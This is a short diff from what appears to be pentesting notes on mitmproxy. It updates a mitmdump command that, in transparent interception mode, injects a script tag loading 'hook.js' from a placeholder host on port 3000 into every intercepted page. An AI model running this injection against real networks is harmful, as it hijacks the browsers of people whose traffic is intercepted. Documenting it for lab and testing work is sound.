@@ -276,7 +276,7 @@ mitmweb -m transparent
 ```
 MitmDump
 ```
-mitmdump -m transparent --replace :~bs:"</body>":"<script src="http://ip:3000/hook.js"></script></body>"
+mitmdump -m transparent --modify-body /~s/"</body>"/"<script src='http://ip:3000/hook.js'></script></body>"
 ```
 
 2 Main operation modes:
